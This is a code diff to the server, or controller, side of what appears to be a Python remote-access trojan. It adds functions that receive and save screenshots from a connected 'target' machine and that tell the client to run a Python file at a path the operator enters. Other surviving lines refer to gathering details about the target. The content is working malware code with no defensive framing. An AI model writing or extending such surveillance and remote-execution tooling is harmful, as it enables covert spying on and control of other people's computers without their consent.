@@ -4,7 +4,7 @@ import socket
 import string
 import sys
 import time
-
+from mss import mss
 
 class Server:
     def __init__(self, ip, port, buffer_size):
@@ -16,7 +16,7 @@ class Server:
         self.connections = []  # connections list
         self.info = ""  # info about target
         self.recvcounter = 0  # counter for received files
-
+        self.sscount =  0
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     # try to update buffer size
@@ -93,6 +93,8 @@ class Server:
         input()
         while True:
             #self.getTargetInfo()
+            self.screenshot()
+            input("Complete")
             pass
 
     def disconn(self):
@@ -139,6 +141,36 @@ class Server:
         print("**** Check moreinfo.txt for even more details on the target ****")
 
         return info
+
+    def exePy(self):
+        #command = "-exePy"
+        #self.client_socket.send(command.encode())
+        filename = input("[+] Enter the full filepath: ")
+        self.client_socket.send(filename.encode())
+        print("FilePath Sent")
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        print("*** " + response + " *** ")
+
+    def screenshot(self):
+        #command = "-SS"
+        #self.client_socket.send(command.encode())
+
+        # recv file size
+        recvsize = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        time.sleep(0.1)
+
+        # updating buffer
+        buff = self.updateBuffer(recvsize)
+
+        # getting the file
+        print("*** Saving screenshot ***")
+        fullscreen = self.saveBigFile(int(recvsize), buff)
+
+        # saving the file
+        with open(f'../receivedfile/{time.time()}.png', 'wb+') as screen:
+            screen.write(fullscreen)
+
+        print("*** File saved ***")
 
 
 
